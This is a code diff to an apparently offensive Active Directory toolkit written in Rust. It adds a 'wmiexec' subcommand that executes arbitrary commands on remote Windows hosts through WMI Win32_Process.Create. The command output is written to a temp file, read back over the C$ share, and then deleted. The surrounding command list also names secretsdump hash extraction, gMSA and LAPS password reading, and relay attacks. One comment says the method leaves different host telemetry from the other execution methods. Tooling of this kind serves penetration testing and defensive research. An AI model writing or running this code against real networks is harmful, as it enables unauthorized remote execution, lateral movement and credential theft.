@@ -224,6 +224,8 @@ enum AttackCmd {
     Exec(ExecArgs),
     /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
     Atexec(ExecArgs),
+    /// Remote command execution over WMI (DCOM → Win32_Process.Create), output captured over C$.
+    Wmiexec(ExecArgs),
     /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
     Secretsdump(SecretsdumpArgs),
     /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
@@ -774,6 +776,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Relay(a)) => relay(a).await,
         Command::Attack(AttackCmd::Exec(a)) => exec_cmd(a).await,
         Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
+        Command::Attack(AttackCmd::Wmiexec(a)) => wmiexec_cmd(a).await,
         Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
         Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
         Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
@@ -998,6 +1001,62 @@ async fn exec_cmd(a: ExecArgs) -> Result<()> {
         Some(o) if !o.is_empty() => println!("\n{o}"),
         Some(_) => println!("[*] command produced no output"),
         None => println!("[*] output not captured (see warnings; command may still have run)"),
+    }
+    Ok(())
+}
+
+/// wmiexec: remote code execution over WMI (DCOM `Win32_Process.Create`). The process runs detached
+/// under WmiPrvSE, so the command is redirected to a temp file and read back over C$ — no service or
+/// scheduled task is created (distinct host telemetry from `exec`/`atexec`).
+async fn wmiexec_cmd(a: ExecArgs) -> Result<()> {
+    use smb2_client::SmbClient;
+    if a.password.is_empty() {
+        anyhow::bail!(
+            "wmiexec requires --password (pass-the-hash is not yet wired for the WMI DCOM bind)"
+        );
+    }
+    // Unique output path under C:\Windows\Temp, redirected inside a cmd wrapper.
+    let tag = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis() as u64)
+        .unwrap_or(0)
+        & 0xff_ffff;
+    let out_rel = format!("Windows\\Temp\\ADHwmi{tag:06x}.out");
+    let out_abs = format!("C:\\{out_rel}");
+    let wrapped = format!("cmd.exe /Q /c {} > {out_abs} 2>&1", a.command);
+
+    let hr = dcerpc::dcom_wmi::wmi_exec(&a.host, &a.domain, &a.user, &a.password, "ADHAMMER", &wrapped)
+        .await?;
+    if hr != 0 {
+        crate::ui::warn(&format!(
+            "Win32_Process.Create returned HRESULT 0x{:08x} (command may not have run)",
+            hr as u32
+        ));
+    } else {
+        crate::ui::ok("process created via WMI (Win32_Process.Create)");
+    }
+
+    // The process is detached — poll-read the output file over C$ until it lands.
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(&mut smb, &a.host, &a.domain, &a.user, &a.password, &a.nt_hash).await?;
+    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+    let mut out = None;
+    for _ in 0..24 {
+        match smb.read_file_delete(&out_rel).await {
+            Ok(b) => {
+                out = Some(b);
+                break;
+            }
+            Err(_) => tokio::time::sleep(std::time::Duration::from_millis(300)).await,
+        }
+    }
+    match out {
+        Some(b) if !b.is_empty() => {
+            let s = String::from_utf8_lossy(&b);
+            println!("\n{}", s.trim_end());
+        }
+        Some(_) => crate::ui::info("command produced no output"),
+        None => crate::ui::info("output not captured (command may still have run)"),
     }
     Ok(())
 }
